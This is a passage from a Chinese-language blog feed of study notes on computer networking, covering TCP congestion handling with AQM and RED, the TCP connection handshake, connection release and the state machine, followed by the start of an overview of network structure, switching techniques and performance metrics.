拥塞控制和网络层采取的策略有密切联系。</p><p>若路由器对某些分组的处理时间特别长，那么这就可能使这些分组中的TCP报文段经过很长时间才能到达终点，结果引起发送方超时，对这些报文段进行重传。</p><p>重传会使 TCP 连接的发送端认为在网络中发生了拥塞，但实际上网络并没有发生拥塞。</p><p>对 TCP 拥塞控制影响最大的就是路由器的分组丢弃策略。</p><h3 id="“先进先出”FIFO-处理规则"><a href="#“先进先出”FIFO-处理规则" class="headerlink" title="“先进先出”FIFO 处理规则"></a>“先进先出”FIFO 处理规则</h3><p>路由器的队列通常都是按照“先进先出”FIFO (First In First Out) 的规则处理到来的分组。</p><p>当队列已满时，以后再到达的所有分组（如果能够继续排队，这些分组都将排在队列的尾部）将都被丢弃。这就叫做尾部丢弃策略 (tail-drop policy)。</p><p>路由器的尾部丢弃往往会导致一连串分组的丢失，这就使发送方出现超时重传，使 TCP 进入拥塞控制的慢开始状态，结果使 TCP 连接的发送方突然把数据的发送速率降低到很小的数值。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/AQM%E5%85%88%E8%BF%9B%E5%85%88%E5%87%BA.gif" alt="AQM先进先出"></p><p>分组丢弃使发送方出现超时重传，使 TCP 连接进入拥塞控制的慢开始状态。如下图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407174557236.png" alt="image-20210407174557236"></p><h3 id="全局同步"><a href="#全局同步" class="headerlink" title="全局同步"></a>全局同步</h3><p>更为严重的是，在网络中通常有很多的 TCP 连接，这些连接中的报文段通常是复用在网络层的 IP 数据报中传送的。</p><p>在这种情况下，若发生了路由器中的尾部丢弃，就可能会同时影响到很多条 TCP 连接，结果使这许多 TCP 连接在同一时间突然都进入到慢开始状态。这在 TCP 的术语中称为全局同步 (global syncronization)。</p><p>全局同步使得全网的通信量突然下降了很多，而在网络恢复正常后，其通信量又突然增大很多。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/AQM%E5%85%88%E8%BF%9B%E5%85%88%E5%87%BA%E5%85%A8%E5%B1%80.gif" alt="AQM先进先出全局"></p><p>分组丢弃使发送方出现超时重传，使多个 TCP 连接同时进入拥塞控制的慢开始状态，发生全局同步。如下图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407174833876.png" alt="image-20210407174833876"></p><h3 id="主动队列管理AQM"><a href="#主动队列管理AQM" class="headerlink" title="主动队列管理AQM"></a>主动队列管理AQM</h3><p>1998 年提出了主动队列管理 AQM (Active Queue Management)。</p><p>所谓“主动”就是不要等到路由器的队列长度已经达到最大值时才不得不丢弃后面到达的分组，而是在队列长度达到某个值得警惕的数值时（即当网络拥塞有了某些拥塞征兆时），就主动丢弃到达的分组。</p><p>AQM 可以有不同实现方法，其中曾流行多年的就是随机早期检测 RED (Random Early Detection)。</p><p>使路由器的队列维持两个参数：队列长度最小门限 THmin 和最大门限 Thmax 。</p><p>RED 对每一个到达的分组都先计算平均队列长度 LAV 。</p><ol><li>若平均队列长度小于最小门限 THmin，则将新到达的分组放入队列进行排队。</li><li>若平均队列长度超过最大门限 Thmax ，则将新到达的分组丢弃。</li><li>若平均队列长度在最小门限 THmin 和最大门限 Thmax 之间，则按照某一概率 p 将新到达的分组丢弃。</li></ol><p>RED 将路由器的到达队列划分成为三个区域： </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407175008385.png" alt="image-20210407175008385"></p><p>当 LAV  &gt;  Thmin 时，丢弃概率 p = 0。<br>当 LAV  &gt;  Thmax 时，丢弃概率 p = 1。<br>当 Thmin &lt; LAV &lt; Thmax时，  0 &lt; p  &lt; 1 。</p><p>在 RED 的操作中，最难处理的就是丢弃概率 p 的选择，因为 p 并不是个常数。例如，按线性规律变化，从 0 变到 pmax。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407175116102.png" alt="image-20210407175116102"></p><p>多年的实践证明，RED 的使用效果并不太理想。</p><p>2015 年公布的 RFC 7567 已经把 RFC 2309 列为“陈旧的”，并且不再推荐使用 RED。</p><p>对路由器进行主动队列管理 AQM 仍是必要的。</p><p>AQM 实际上就是对路由器中的分组排队进行智能管理，而不是简单地把队列的尾部丢弃。</p><p>现在已经有几种不同的算法来代替旧的 RED，但都还在实验阶段。</p><h1 id="TCP的运输连接管理"><a href="#TCP的运输连接管理" class="headerlink" title="TCP的运输连接管理"></a>TCP的运输连接管理</h1><p>TCP 是面向连接的协议。<br>TCP 连接有三个阶段：</p><ol><li>连接建立</li><li>数据传送</li><li>连接释放</li></ol><p>TCP 连接的管理就是使 TCP 连接的建立和释放都能正常地进行</p><p><strong>TCP 连接建立过程中要解决的三个问题</strong></p><ol><li><p>要使每一方能够确知对方的存在。</p></li><li><p>要允许双方协商一些参数（如最大窗口值、是否使用窗口扩大选项和时间戳选项以及服务质量等）。</p></li><li><p>能够对运输实体资源（如缓存大小、连接表中的项目等）进行分配。</p></li></ol><p>TCP 连接的建立采用客户服务器方式。主动发起连接建立的应用进程叫做客户 (client)。被动等待连接建立的应用进程叫做服务器 (server)。</p><h2 id="TCP-的连接建立（三报文握手）"><a href="#TCP-的连接建立（三报文握手）" class="headerlink" title="TCP 的连接建立（三报文握手）"></a>TCP 的连接建立（三报文握手）</h2><p>TCP 建立连接的过程叫做握手。<br>握手需要在客户和服务器之间交换三个 TCP 报文段。称之为三报文握手。</p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>通过连续的动画来理解这个过程</p><p>存在这样两台机子——客户A，服务器B，它们都处于关机状态</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408073223940.png" alt="image-20210408073223940"></p><p>现在B的 TCP 服务器进程先创建传输控制块TCB，准备接受客户进程的连接请求。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408073248750.png" alt="image-20210408073248750"></p><p>这时候A想要和B进行通信，它开机了，然后A 的 TCP 向 B 发出连接请求报文段，其首部中的同步位 SYN = 1，并选择序号 seq = x，表明传送数据时的第一个数据字节的序号是 x。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408073345058.png" alt="image-20210408073345058"></p><p>B 的 TCP 收到连接请求报文段后，如同意，则发回确认。<br>B 在确认报文段中应使 SYN = 1，使 ACK = 1，其确认号 ack = x + 1，自己选择的序号 seq = y。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408073403752.png" alt="image-20210408073403752"></p><p>A 收到此报文段后向 B 给出确认，其 ACK = 1，确认号 ack = y + 1。<br>A 的 TCP 通知上层应用进程，连接已经建立。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408073424503.png" alt="image-20210408073424503"></p><p>B 的 TCP 收到主机 A 的确认后，也通知其上层应用进程：TCP 连接已经建立。他们之间可以进行数据通信了</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408073447876.png" alt="image-20210408073447876"></p><p>完整的TCP三报文握手示意图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408073500365.png" alt="image-20210408073500365"></p><h3 id="为什么要采取三报文握手"><a href="#为什么要采取三报文握手" class="headerlink" title="为什么要采取三报文握手"></a>为什么要采取三报文握手</h3><p>这里初学会有一个疑问，为什么要采取三报文握手呢，客户为什么还要再发一次确认收到呢，除了网上大家通俗的理解：为了让服务器知道我知道了外，主要还有以下原因——<strong>为了防止已失效的连接请求报文段突然又传送到了，因而产生错误。</strong></p><p>形象理解一下这句话，假设现在不需要第三个报文，然后发生这么一个故事</p><p>客户端在发送请求的过程中，第一个请求因为某些原因，在路上迷路了，客户端会再发送一次请求，以建立连接，等到连接释放，他想要的数据服务器已经给回它了的时候，巧了，迷路的请求来到服务器这边了，服务器就误以为客户端又要发起一次连接，于是响应过去，连接建立，但客户端此时不需要交互了啊，所以它也觉得莫名其妙，你服务器和我连接干啥，又没叫你，自作多情，然后客户端就没搭理服务器端，就这样，服务器端白白浪费了资源，一直处于连接过程</p><p>所以，为了解决客户端是真心想要和服务器建立连接的，它必须发送确认报文，用以确认连接正式建立</p><h3 id="TCO三次握手翻译得并不准确"><a href="#TCO三次握手翻译得并不准确" class="headerlink" title="TCO三次握手翻译得并不准确"></a>TCO三次握手翻译得并不准确</h3><p>还有一点需要注意：网上广而流传的TCP三次握手这个说法并不准确，书中提到，three way handshake，直译过来成三报文握手更合适，因为handshake是单数，而不是复数，这意味着，它们更像是通过握手上下摇晃三次，而不是握了三次手，RFC 793 文档中也有另外的表述，three way （three message）handshake，更加印证了这个译名。</p><h3 id="TCP四报文握手"><a href="#TCP四报文握手" class="headerlink" title="TCP四报文握手"></a>TCP四报文握手</h3><p>B发送给A的报文段可以分成两个，也就是先发送一个确认报文段（ACK = 1, ack = x + 1），然后再发送一个同步报文段（SYN = 1， seq = y），这样就变成了四报文握手，但效果一样</p><h2 id="TCP-的连接释放（四报文握手）"><a href="#TCP-的连接释放（四报文握手）" class="headerlink" title="TCP 的连接释放（四报文握手）"></a>TCP 的连接释放（四报文握手）</h2><p>TCP 连接释放过程比较复杂。</p><p>数据传输结束后，通信的双方都可释放连接。</p><p>TCP 连接释放过程是四报文握手。</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>数据传输结束后，通信的双方都可释放连接。<br>现在 A 的应用进程先向其 TCP 发出连接释放报文段，并停止再发送数据，主动关闭 TCP 连接。<br>A 把连接释放报文段首部的FIN = 1，其序号seq = u，等待 B 的确认。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408080755867.png" alt="image-20210408080755867"></p><p>B 发出确认，确认号 ack = u+1，而这个报文段自己的序号 seq = v。<br>TCP 服务器进程通知高层应用进程。<br>从 A 到 B 这个方向的连接就释放了，TCP 连接处于半关闭状态。<strong>B 若发送数据，A 仍要接收</strong>。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408080834500.png" alt="image-20210408080834500"></p><p>若 B 已经没有要向 A 发送的数据，其应用进程就通知 TCP 释放连接。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408080857738.png" alt="image-20210408080857738"></p><p> A 收到连接释放报文段后，必须发出确认。 </p><p> 在确认报文段中ACK = 1，确认号 ack = w + 1，自己的序号 seq = u + 1。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408080923219.png" alt="image-20210408080923219"></p><p>完整图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408081005627.png" alt="image-20210408081005627"></p><h3 id="A-必须等待-2MSL-的时间"><a href="#A-必须等待-2MSL-的时间" class="headerlink" title="A 必须等待 2MSL 的时间"></a>A 必须等待 2MSL 的时间</h3><p>在这个图中你会发现：A 必须等待 2MSL 的时间，为什么呢，原因有两个</p><ol><li><p>为了保证 A 发送的最后一个 ACK 报文段能够到达 B。</p><p>假设A最后一个确认连接释放报文没有被B正常收到时，B会超时重传连接释放报文，而如果这时候A急着关闭，就不知道B发过来了，所以需要等一会时间保证自己的报文成功被B收到</p></li><li><p>防止 “已失效的连接请求报文段”出现在本连接中。</p><p>同前面讲的一样，在经过2MSL时间后，A会将本连接的所有产生的报文从网络上消失掉，不管你是否丢失，都把你逮住，然后让你消失，防止下一次新连接中会出现旧连接的请求报文</p></li></ol><h3 id="保活计时器"><a href="#保活计时器" class="headerlink" title="保活计时器"></a>保活计时器</h3><p><strong>干啥的</strong>：用来防止在TCP连接出现长时期的空闲。</p><p><strong>工作方式</strong>是啥：保活计时器 通常设置为2小时 。若服务器过了2小时还没有收到客户的信息，它就发送探测报文段。若发送了10个探测报文段（每一个相隔75秒）还没有响应，就假定客户出了故障，因而就终止该连接。 </p><h2 id="TCP-的有限状态机"><a href="#TCP-的有限状态机" class="headerlink" title="TCP 的有限状态机"></a>TCP 的有限状态机</h2><p>不行了不行了，整理不下去了，写不下去了，直接丢图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210408082211484.png" alt="image-20210408082211484"></p><p>解释下图内标注含义⬇</p><p>箭头旁边的字，表明引起这种变迁的原因，或表明发生状态变迁后又出现什么动作。</p><p>图中有三种不同的箭头。</p><ol><li>粗实线箭头表示对客户进程的正常变迁。</li><li>粗虚线箭头表示对服务器进程的正常变迁。</li><li>细线箭头表示异常变迁。 </li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络概述</title>
      <link href="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/"/>
      <url>/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>注：内容根据《计算机网络第七版》以及相关PPT整理制作，图片主要源于{电子工程出版社}，部分图片源于学校老师上课所画的图以及自己制作的思维导图</p></blockquote><p>主要讲了计算机网络五大层结构，后面有时间会补上<strong>网络安全</strong>、<strong>互联网上的音频/视频服务</strong>以及<strong>无线网络和移动网络</strong>，以下先讲讲计算机网络的概述，通过对计算机网络各个名词的学习和体系结构的初步认识，从而增加对后面学习的理解，之后会通过思维导图导入各层学习</p><h1 id="计算机网络定义"><a href="#计算机网络定义" class="headerlink" title="计算机网络定义"></a>计算机网络定义</h1><p>计算机网络主要是由一些通用的、可编程的硬件互连而成的，而这些硬件并非专门用来实现某一特定目的（例如，传送数据或视频信号）。这些可编程的硬件能够用来传送多种不同类型的数据，并能支持广泛的和日益增长的应用。</p><h2 id="互联网的组成"><a href="#互联网的组成" class="headerlink" title="互联网的组成"></a>互联网的组成</h2><p>先放出一张图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418102236857.png" alt="image-20210418102236857"></p><h2 id="边缘部分"><a href="#边缘部分" class="headerlink" title="边缘部分"></a>边缘部分</h2><blockquote><p>处在互联网边缘的部分就是连接在互联网上的所有的主机。这些主机又称为端系统 (end system)。</p></blockquote><p>端系统在功能上可能有很大的差别：</p><ol><li>小的端系统可以是一台普通个人电脑，具有上网功能的智能手机，甚至是一个很小的网络摄像头。</li><li>大的端系统则可以是一台非常昂贵的大型计算机。</li><li>端系统的拥有者可以是个人，也可以是单位（如学校、企业、政府机关等），当然也可以是某个 ISP。</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418102356227.png" alt="image-20210418102356227"></p><p>然后，端之间通信（比如主机A和主机B进行通信）实际上是指：<strong>“运行在主机 A 上的某个程序和运行在主机 B 上的另一个程序进行通信”。</strong>这个相关内容可以通过运输层和应用层了解</p><p>端系统之间的通信方式通常可划分为两大类：</p><blockquote><p>客户-服务器方式（C/S方式）<br>即 Client/Server 方式，简称为 C/S 方式。 </p></blockquote><blockquote><p>对等方式（P2P方式）<br>即 Peer-to-Peer 方式 ，简称为 P2P 方式。</p></blockquote><h3 id="客户-服务器方式"><a href="#客户-服务器方式" class="headerlink" title="客户-服务器方式"></a>客户-服务器方式</h3><p><strong>客户</strong> (client) 和<strong>服务器</strong> (server) 都是指通信中所涉及的两个应用进程。</p><p>客户-服务器方式所描述的是进程之间服务和被服务的关系。</p><p>客户是<strong>服务的请求方</strong>，服务器是<strong>服务的提供方</strong>。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418102656794.png" alt="image-20210418102656794"></p><blockquote><p>客户软件：被用户调用后运行，在打算通信时主动向远地服务器发起通信（请求服务）。因此，<strong>客户程序必须知道服务器程序的地址</strong>。</p><p>不需要特殊的硬件和很复杂的操作系统。 </p></blockquote><blockquote><p>服务器软件：一种专门用来提供某种服务的程序，可<strong>同时处理多个远地或本地客户的请求</strong>。</p><p><strong>系统启动后即自动调用并一直不断地运行着</strong>，被动地等待并接受来自各地的客户的通信请求。因此，服务器程序不需要知道客户程序的地址。</p><p>一般需要强大的硬件和高级的操作系统支持。</p></blockquote><p>客户与服务器的通信关系建立后，通信可以是双向的，客户和服务器都可发送和接收数据。</p><p>相关详细内容可以通过运输层和应用层阅读到，当然前三层涉及到的知识也很重要</p><h3 id="对等连接方式"><a href="#对等连接方式" class="headerlink" title="对等连接方式"></a>对等连接方式</h3><p><strong>对等连接 (peer-to-peer，简写为 P2P )</strong> 是指两个主机<strong>在通信时并不区分哪一个是服务请求方还是服务提供方</strong>。</p><p>只要两个主机都运行了对等连接软件 ( P2P 软件) ，它们就可以进行<strong>平等的、对等连接通信</strong>。</p><p>双方都可以下载对方已经存储在硬盘中的共享文档。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418103029567.png" alt="image-20210418103029567"></p><p>对等连接方式从本质上看仍然是使用客户服务器方式，只是对等连接中的每一个主机既是客户又是服务器。例如主机 C 请求 D 的服务时，C 是客户，D 是服务器。但如果 C 又同时向 F提供服务，那么 C 又同时起着服务器的作用。对等连接工作方式可支持大量对等用户（如上百万个）同时工作。</p><h2 id="互联网的核心部分"><a href="#互联网的核心部分" class="headerlink" title="互联网的核心部分"></a>互联网的核心部分</h2><p>网络核心部分是互联网中最复杂的部分。网络中的核心部分要向网络边缘中的大量主机提供连通性，使边缘部分中的任何一个主机都能够向其他主机通信（即传送或接收各种形式的数据）。</p><p><strong>在网络核心部分起特殊作用的是路由器 (router)。</strong>路由器是实现<strong>分组交换 (packet switching)</strong> 的关键构件，其任务是转发收到的分组，这是网络核心部分<strong>最重要的功能</strong>。（所以网络层那一章的知识很重要）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418103325964.png" alt="image-20210418103325964"></p><p><strong>典型交换技术包括：</strong></p><ol><li>电路交换</li><li>分组交换</li><li>报文交换等</li></ol><p><strong>互联网的核心部分采用了分组交换技术。</strong></p><p>下面简述各交换技术的特点</p><h3 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h3><p>首先，如果我们需要两个电话能进行通信，比较简单，在两者之间连接一条电话线即可实现。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418104110956.png" alt="image-20210418104110956"></p><p>现在，问题复杂了，如果五个电话都想要可以互相通信（两两连接）呢</p><p>那么它们之间就需要十对电话线</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418104252231.png" alt="image-20210418104252231"></p><p>由此我们可以得出：N 部电话机两两直接相连，需 N(N –1)/2 对电线。这种直接连接方法所需要的电线对的数量与电话机数量的平方（N 2）成正比。这个数量随着电话的增加会出现疯狂的增长，所需要的电话线会非常多，这时，如果通过<strong>交换机</strong>我们就可以实现全网的交换任务了，同时减少了彼此之间的电话线，转由交换机统一管理</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418104547321.png" alt="image-20210418104547321"></p><p>每一部电话都直接连接到交换机上，而交换机使用交换的方法，让电话用户彼此之间可以很方便地通信。 <strong>所采用的交换方式就是电路交换 (circuit switching)。</strong></p><p>什么是交换：<strong>从通信资源的分配角度来看，“交换”就是按照某种方式动态地分配传输线路的资源</strong></p><p>电路交换必定是面向连接的。 </p><p>电路交换分为三个阶段：</p><ol><li><strong>建立连接：</strong>建立一条专用的物理通路，以保证双方通话时所需的通信资源在通信时不会被其他用户占用；</li><li><strong>通信：</strong>主叫和被叫双方就能互相通电话；</li><li><strong>释放连接：</strong>释放刚才使用的这条专用的物理通路（释放刚才占用的所有通信资源）。</li></ol><p>面向连接的电路交换会有什么样的问题：<strong>电路交换的用户始终占用端到端的通信资源</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418104805420.png" alt="image-20210418104805420"></p><h3 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h3><p>分组交换则采用<strong>存储转发</strong>技术。</p><p>在发送端，先把较长的报文<strong>划分成较短的、固定长度的数据段。</strong> </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418104932663.png" alt="image-20210418104932663"></p><p>首先在每一个数据段前面添加上首部构成分组 (packet)。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/%E5%88%86%E7%BB%84%E4%BA%A4%E6%8D%A2.gif" alt="分组交换"></p><p>分组交换网以“分组”作为数据传输单元。依次把各分组发送到接收端（假定接收端在左边）。</p><p>然后，接收端收到分组后剥去首部还原成报文。</p><p>最后，在接收端把收到的数据恢复成为原来的报文。</p><p>这一交换的过程需要有一个前提：这里我们假定分组在传输过程中没有出现差错，在转发时也没有被丢弃。</p><p><strong>分组交换的传输单元</strong></p><p>每一个分组的首部都含有地址（诸如目的地址和源地址）等控制信息。分组交换网中的结点交换机根据收到的分组首部中的地址信息，把分组转发到下一个结点交换机。每个分组在互联网中独立地选择传输路径。用这样的存储转发方式，最后分组就能到达最终目的地。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418134245270.png" alt="image-20210418134245270"></p><p>数据传输过程中，负责转发分组的便是<strong>路由器</strong></p><p>在路由器中的输入和输出端口之间没有直接连线。<br>路由器处理分组的过程是：</p><ol><li>把收到的分组先放入缓存（暂时存储）；</li><li>查找转发表，找出到某个目的地址应从哪个端口转发；</li><li>把分组送到适当的端口转发出去。</li></ol><p>注意：主机和路由器并不相同，主机是<strong>为用户进行信息处理</strong>的，并向网络发送分组，从网络接收分组。路由器<strong>对分组进行存储转发</strong>，最后把分组交付目的主机。学到后面，你会发现它们之间更多的区别</p><p>那么，分组转发有什么优点呢</p><table><thead><tr><th>优点</th><th>所采用的手段</th></tr></thead><tbody><tr><td><strong>高效</strong></td><td>在分组传输的过程中动态分配传输带宽，对通信链路是逐段占用。</td></tr><tr><td><strong>灵活</strong></td><td>为每一个分组独立地选择最合适的转发路由。</td></tr><tr><td><strong>迅速</strong></td><td>以分组作为传送单位，可以不先建立连接就能向其他主机发送分组。</td></tr><tr><td><strong>可靠</strong></td><td>保证可靠性的网络协议；分布式多路由的分组交换网，使网络有很好的生存性。</td></tr></tbody></table><p>当然他也存在一定缺点</p><p>分组在各结点存储转发时需要排队，这就会造成一定的<strong>时延</strong>。 分组必须携带的首部（里面有必不可少的控制信息）也造成了一定的开销。 </p><p>最后，用一张图表示它们的区别</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418134753955.png" alt="image-20210418134753955"></p><p>三种交换的比较</p><ul><li>若要连续传送大量的数据，且其传送时间远大于连接建立时间，则电路交换的传输速率较快。</li><li>报文交换和分组交换不需要预先分配传输带宽，在传送突发数据时可提高整个网络的信道利用率</li><li>由于一个分组的长度往往远小于整个报文的长度，因此分组交换比报文交换的时延小，同时也具有更好的灵活性。</li></ul><h1 id="不同类别的网络"><a href="#不同类别的网络" class="headerlink" title="不同类别的网络"></a>不同类别的网络</h1><h2 id="按照网络的作用范围进行分类"><a href="#按照网络的作用范围进行分类" class="headerlink" title="按照网络的作用范围进行分类"></a>按照网络的作用范围进行分类</h2><ul><li><strong>广域网 WAN (Wide Area Network)</strong>：作用范围通常为几十到几千公里。</li><li><strong>城域网 MAN (Metropolitan Area Network)</strong>：作用距离约为 5~50 公里。</li><li><strong>局域网 LAN (Local Area Network)</strong> ：局限在较小的范围（如 1 公里左右）。</li><li><strong>个人区域网 PAN (Personal Area Network)</strong> ：范围很小，大约在 10 米左右。</li></ul><blockquote><p>若中央处理机之间的距离非常近（如仅 1 米的数量级甚至更小些），则一般就称之为多处理机系统，而不称它为计算机网络。 </p></blockquote><h2 id="按照网络的使用者进行分类"><a href="#按照网络的使用者进行分类" class="headerlink" title="按照网络的使用者进行分类"></a>按照网络的使用者进行分类</h2><ul><li>公用网 (public network)<br>按规定交纳费用的人都可以使用的网络。因此也可称为公众网。</li><li>专用网 (private network)<br>为特殊业务工作的需要而建造的网络。</li></ul><p>公用网和专用网都可以提供多种服务。如传送的是计算机数据，则分别是公用计算机网络和专用计算机网络。</p><h1 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h1><p>计算机网络的性能一般是指它的几个重要的性能指标，主要包括：</p><ul><li>速率</li><li>带宽</li><li>吞吐率</li><li>时延</li><li>时延带宽积</li><li>往返时间 RTT</li><li>利用率</li></ul><h2 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h2><p>在了解速率之前，首先了解数据的单位——比特</p><blockquote><p>比特（bit）是计算机中数据量的单位，也是信息论中使用的信息量的单位。比特（bit）来源于 binary digit，意思是一个“二进制数字”，因此一个比特就是二进制数字中的一个 1 或 0。</p></blockquote><p><strong>速率是计算机网络中最重要的一个性能指标，指的是数据的传送速率，它也称为数据率 (data rate) 或比特率 (bit rate)。</strong></p><p>速率的单位是 bit/s，或 kbit/s、Mbit/s、 Gbit/s等。</p><p>例如4 * 10¹⁰  bit/s 的数据率就记为 40 Gbit/s。</p><p><strong>速率往往是指额定速率或标称速率，非实际运行速率（受带宽影响）。</strong>  </p><h2 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h2><p>两种不同意义：</p><ul><li><strong>“带宽”(bandwidth) 本来是指信号具有的频带宽度，其单位是赫（或千赫、兆赫、吉赫等）。</strong></li><li>在计算机网络中，带宽用来表示网络中<strong>某通道传送数据的能力</strong>。表示在单位时间内网络中的<strong>某信道所能通过的“最高数据率”</strong>。单位是 bit/s，即 “比特每秒”。    </li></ul><p>自己的理解：类似于高速公路和普通公路吧，车道（高速公路至少为六车道）越多，也就是公路越宽，单位时间内通过的容量越大，而普通公路，一般为二车道，宽度容量相较于高速公路就会小些</p><p>在“带宽”的上述两种表述中，前者为<strong>频域称谓</strong>，而后者为<strong>时域称谓</strong>，其本质是相同的。也就是说，一条通信链路的“带宽”越宽，其所能传输的“最高数据率”也越高。</p><p>速率和带宽的区别便是：速率有关于物理媒介，也就是物理层，而带宽会收到五层协议栈的影响，比如你买的100M电信宽带，然后接入了10M的以太网网线，那么宽带就是指你的带宽，而以太网网线则是指速率。</p><h2 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h2><p><strong>吞吐量 (throughput) 表示在单位时间内通过某个网络（或信道、接口）的数据量。</strong></p><p>吞吐量更经常地用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。</p><p><strong>吞吐量受网络的带宽或网络的额定速率的限制。</strong>  </p><p>又来自己的理解了，拿前面的例子，六车道高速公路代表着，每单位时间最多只能同时通过六辆车，这相当于是带宽等于6，但不可能每时每刻都那么巧同时有六辆车通过的，可能是一辆、两辆、或者三辆等，那么，这个时候通过的车辆数就是吞吐量</p><p>简单来说，吞吐量便是实际速率，而带宽就是额定速率</p><h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>时延 (delay 或 latency) 是指数据（一个报文或分组，甚至比特）从网络（或链路）的<strong>一端传送到另一端所需的时间</strong>。</p><p>有时也称为<strong>延迟</strong>或迟延。</p><p>网络中的时延由以下4个不同的部分组成：</p><ol><li><p>发送时延</p><p>发送时延也称为传输时延。发送数据时，数据帧从结点进入到传输媒体所需要的时间。也就是从发送数据帧的第一个比特算起，到该帧的最后一个比特发送完毕所需的时间。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/image-20210418142506439.png" 